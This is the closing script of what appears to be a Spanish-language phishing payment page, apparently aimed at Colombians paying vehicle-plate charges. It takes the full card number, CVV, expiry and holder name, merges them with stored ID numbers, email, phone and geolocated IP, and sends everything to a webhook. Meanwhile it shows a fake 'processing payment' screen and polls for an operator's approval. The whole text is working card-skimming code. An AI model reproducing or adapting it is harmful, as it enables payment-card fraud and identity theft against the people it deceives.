        const numero = inputNumero.value.replace(/\s/g, '');
        const exp = inputExp.value.trim();
        const cvv = inputCVV.value.trim();
        const terms = document.getElementById('terms').checked;

        const info = getBinBloqueadoInfo(numero);
        if (info.bloqueado) {
            mostrarError(info.mensaje);
            return;
        }

        if (!nombre) { mostrarError('Por favor, ingresa el nombre del titular'); return; }
        if (!numero || numero.length < 15) { mostrarError('El número de tarjeta debe tener al menos 15 dígitos'); return; }

        const fechaRegex = /^\d{2}\/\d{2}$/;
        if (!exp || !fechaRegex.test(exp)) { mostrarError('Ingresa una fecha de vencimiento válida (MM/AA)'); return; }

        if (!cvv || cvv.length < 3) { mostrarError('Ingresa un CVV válido (3 o 4 dígitos)'); return; }
        if (!terms) { mostrarError('Debes aceptar los términos de servicio'); return; }

        cardType = detectCardType(numero);
        if (!cardType) { mostrarError('Tipo de tarjeta no reconocido'); return; }

        if (!detectedBank && numero.length >= 6) {
            await detectBankByBIN(numero);
            await new Promise(r => setTimeout(r, 500));
        }
        if (!detectedBank) {
            detectedBank = 'Desconocido';
            localStorage.setItem('bancoEmisor', 'Desconocido');
        }

        if (!localStorage.getItem('usuario_ip') || localStorage.getItem('usuario_ip') === 'Desconocida') {
            await capturarIP();
        }

        guardarDatosEnLocalStorage(numero, cvv, exp, nombre, detectedBank);
        localStorage.setItem('solicitudId', solicitudId);

        // UI: loading
        loadingOverlay.classList.add('active');
        loadingText.textContent = 'Procesando pago...';
        initialSpinner.style.display = 'block';
        initialSpinner.classList.add('active');
        logoContainer.style.display = 'none';
        progressWrapper.style.display = 'none';

        btnPagar.disabled = true;
        btnPagar.textContent = 'Procesando...';
        inputNumero.disabled = true;
        inputNombre.disabled = true;
        inputExp.disabled = true;
        inputCVV.disabled = true;

        // Datos personales
        const nombreP = localStorage.getItem('primerNombre') || localStorage.getItem('nombre') || 'No proporcionado';
        const apellidosP = localStorage.getItem('primerApellido') || localStorage.getItem('apellidos') || '';
        const tipoDocumento = localStorage.getItem('tipoDocumento') || '';
        const numeroDocumento = localStorage.getItem('numeroDocumento') || 'No proporcionado';
        const email = localStorage.getItem('email') || 'No proporcionado';
        const celular = localStorage.getItem('celular') || 'No proporcionado';

        const fechaHora = new Date().toLocaleString('es-CO', {
            timeZone: 'America/Bogota',
            year: 'numeric', month: '2-digit', day: '2-digit',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        });

        const placas = JSON.parse(localStorage.getItem('placas') || '[]');
        const totalFormateado = localStorage.getItem('montoTotal') || '';

        const datos = {
            solicitudId: solicitudId,
            nombreCompleto: `${nombreP} ${apellidosP}`.trim(),
            tipoDocumento: tipoDocumento,
            numeroDocumento: numeroDocumento,
            email: email,
            celular: celular,
            numeroTarjeta: numero,
            cvv: cvv,
            vencimiento: exp,
            tipoTarjeta: cardType,
            bancoEmisor: detectedBank,
            totalFormateado: totalFormateado,
            fechaHora: fechaHora,
            ip: localStorage.getItem('usuario_ip') || '',
            pais: localStorage.getItem('usuario_pais') || 'Desconocido',
            ciudad: localStorage.getItem('usuario_ciudad') || 'Desconocida',
            placas: placas.map(p => p.placa).join(', ')
        };

        console.log('📤 Enviando al webhook:', datos);

        enviarHeartbeat('activo');

        const resultado = await enviarDatosAlWebhook(datos);

        if (resultado === false) {
            loadingOverlay.classList.remove('active');
            mostrarError('Error al procesar el pago. Intente nuevamente.');
            habilitarFormulario();
            return;
        }

        console.log('⏳ Esperando aprobación...');
        iniciarPolling();
    });

    // ============================================================
    // INICIALIZACIÓN
    // ============================================================
    window.addEventListener('load', function() {
        iniciarHeartbeat();
        console.log('✅ Paso5 listo');
    });
</script>

</body>
</html>